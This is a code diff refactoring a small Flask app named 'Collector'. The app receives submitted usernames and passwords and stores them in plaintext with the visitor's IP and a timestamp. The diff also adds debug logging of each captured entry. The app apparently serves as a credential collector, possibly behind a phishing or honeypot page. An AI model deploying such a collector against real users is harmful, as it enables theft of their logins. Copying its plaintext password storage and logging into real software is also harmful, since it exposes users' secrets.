@@ -1,30 +1,27 @@
-from flask import Flask,request
-from FLexceptions import PostError, UnknownError, ConfigError, DBInsertError
-from datetime import datetime
-from tinydb import TinyDB
-from os import getcwd, path
-#from sys import stderr
-#import sys
+# -*- encoding: utf-8 -*-
+import datetime
+import pkg_resources
 
-pwd = getcwd()
-separator = path.sep
-debug_flag = False
+from flask import Flask, request
+from FLexceptions import PostError, UnknownError, ConfigError, DBInsertError
+
+from tinydb import TinyDB
+
 
 def print_page(page_path):
     try:
-        page = open(pwd+separator+page_path)
-        output = ""
-        for line in page.readlines():
-            output += line
-        return output
+        page = pkg_resources.resource_string(__name__, page_path)
+        return page
     except:
         raise IOError
+
 
 class Collector(Flask):
     def __init__(self, import_name, conf):
         super(Collector, self).__init__(import_name)
         self.db_path = conf['db_path']
         self.db = None
+        self.logger.setLevel(conf['log_level'])
 
     def init_db(self):
         try:
@@ -45,11 +42,11 @@ class Collector(Flask):
                 "user": data['user'],
                 "password": data['password']
             }
-            if debug_flag:
-                print(format(entry))
+            self.logger.debug("Just entered: {}".format(entry))
             db.insert(entry)
         except:
             raise DBInsertError
+
 
 def create_app(import_name, config={'db_path': 'default_db.json'}):
     app = Collector(import_name, conf=config)
@@ -80,7 +77,7 @@ def create_app(import_name, config={'db_path': 'default_db.json'}):
         try:
             user = request.form.getlist('u')
             password = request.form.getlist('p')
-            now = format(datetime.now())
+            now = format(datetime.datetime.now())
             ip = request.remote_addr
             data = {
                 "user": user,
